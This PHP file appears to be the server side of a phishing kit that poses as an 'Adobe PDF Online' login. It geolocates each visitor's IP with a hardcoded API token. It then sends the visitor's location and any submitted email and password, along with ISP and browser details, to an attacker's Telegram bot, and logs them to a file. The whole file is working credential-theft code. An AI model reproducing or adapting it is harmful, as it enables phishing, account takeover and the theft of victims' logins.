<?php

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header("Access-Control-Allow-Headers: X-Requested-With");
header('Content-Type: application/json; charset=utf-8');

include 'config.php'; // BOT_TOKEN and CHAT_ID defined
session_start();
$csrf_token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $csrf_token;

$ip = get_client_ip();
$geourl = "https://api.findip.net/$ip/?token=eb48f1bae0844db69a5823e8618ce1ce";
$cityName = "";
$countryName = "";
$isp = "";

$geoData = url_get_contents($geourl);
if ($geoData) {
    // Decode the JSON into an associative array
    $data = json_decode($geoData, true);

    // Extract desired fields
    $cityName = $data['city']['names']['en'] ?? 'N/A';
    $countryName = $data['country']['names']['en'] ?? 'N/A';
    $isp = $data['traits']['isp'] ?? 'N/A';

} else {
    echo "Failed to fetch Geo Data.";
}

function sendTelegramMessage($botToken, $chatId, $message) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $botToken . "/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'Markdown']));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log('Telegram Error: ' . curl_error($ch));
    }
    curl_close($ch);
    return $response;
}

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function url_get_contents($Url) {
    if (!function_exists('curl_init')){ 
        die('CURL is not installed!');
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function deobfuscate($str, $key = 42) {
    $result = '';
    if (!is_string($str)) {
        error_log("Non-string input to deobfuscate: " . print_r($str, true));
        return $str;
    }
    for ($i = 0; $i < strlen($str); $i++) {
        $result .= chr(ord($str[$i]) ^ $key);
    }
    if (is_numeric($result) && strpos($result, '.') === false) {
        return (int)$result;
    }
    return $result ?: 'Unknown';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['visit'])) {
    
    // Server-side geolocation
    $msg = "👣 *Page Visited: AdobePDF*\n📍 *Location:* $cityName, $countryName\n *IP:* $ip";
    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $msg);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'], $_POST['password'])) {
    
    
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    //$stay = deobfuscate($_POST['stay'] ?? '');
    //$isp = deobfuscate($_POST['isp'] ?? 'N/A');
    //$city = deobfuscate($_POST['city'] ?? '');
    //$country = deobfuscate($_POST['country'] ?? '');
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $attempt = $_POST['attempt'] ?? '0';


    if ($attempt === '0' || !is_numeric($attempt)) {
        //error_log("Attempt decoding failed: " . print_r($_POST['attempt'], true));
        //$attempt = 1;
    }


    $msg = "🔐 Adobe PDF Online Login Attempt #$attempt\n\n"
         . "📧 *Email:* $email\n"
         . "🔑 *Password:* $password\n"
         . "🌍 *IP:* $ip\n🏢 *ISP:* $isp \n📍 *Location:* $cityName, $countryName \n🖥 *Browser:* $ua";

    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $msg);

    $myfile = fopen("logs.txt", "a") or die("Unable to open file!");
fwrite($myfile, date("l, d-m-Y h:i:s a")."\n".$message."\n\n");
fclose($myfile);

    http_response_code(200);
    echo json_encode(['status' => 'ok']);
}

if (isset($_GET['test']) && $_GET['test'] === '1') {
    $testMessage = "✅ Test message from VPS at " . date('Y-m-d H:i:s');
    echo sendTelegramMessage(BOT_TOKEN, CHAT_ID, $testMessage);
}
?>